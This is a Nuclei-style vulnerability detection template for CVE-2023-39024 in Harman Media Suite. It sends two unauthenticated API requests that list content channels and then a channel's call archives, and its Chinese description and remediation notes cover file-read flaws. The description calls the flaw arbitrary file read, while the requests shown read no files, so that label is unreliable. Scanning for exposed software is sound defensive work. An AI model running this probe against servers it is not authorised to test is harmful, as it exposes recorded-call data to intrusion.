id: harman-media-suite-lfi

info:
  name: Harman Media Suite <= 4.2.0 - 任意文件读取漏洞（CVE-2023-39024）
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 Harman Media Suite <= 4.2.0 - 任意文件读取漏洞（CVE-2023-39024）。该类漏洞通常源于文件路径或资源参数校验不足，导致攻击者可读取非预期文件。模板主要向 `/userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all`、`/userportal/api/rest/contentChannels/{变量}/archives/?startIndex=0&pageSize=15&sort=time&onlyInclud...` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可读取服务器本地文件、配置文件、源码或系统敏感文件。
    - 若读取到凭据、密钥或应用配置，可能进一步造成账号接管、数据库访问或远程代码执行。
  remediation: |
    - 使用固定文件 ID 或白名单映射访问文件，避免直接使用用户输入拼接文件路径。
    - 对路径进行规范化校验，拒绝目录穿越、协议包装器和绝对路径访问。
    - 降低 Web 进程文件权限，检查是否已有敏感文件被访问或泄露。
  reference:
    - https://github.com/BenTheCyberOne/CVE-2023-39024-5-POC
    - https://sploitus.com/exploit?id=C20FE0B5-806A-5687-850C-75D195576B35
    - https://mediasuite.harman.com/channel-store
  metadata:
    verified: true
    max-request: 2
    vendor: harman
    product: media-suite
    fofa-query: "Harman Media Suite"
  tags: harman,media-suite,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"plcm-content-channel", "privacy", "coverImage")'
          - 'contains(content_type, "application/vnd.plcm.plcm-content-channel-list+json")'
          - 'status_code == 200'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: channelId
        group: 1
        regex:
          - '"channelId":"([^"]+)"'
        internal: true

  - raw:
      - |
        GET /userportal/api/rest/contentChannels/{{channelId}}/archives/?startIndex=0&pageSize=15&sort=time&onlyIncludeApproved=true HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"callId", "displayName", "duration")'
          - 'contains(content_type, "application/vnd.plcm.plcm-csc+json")'
          - 'status_code == 200'
        condition: and
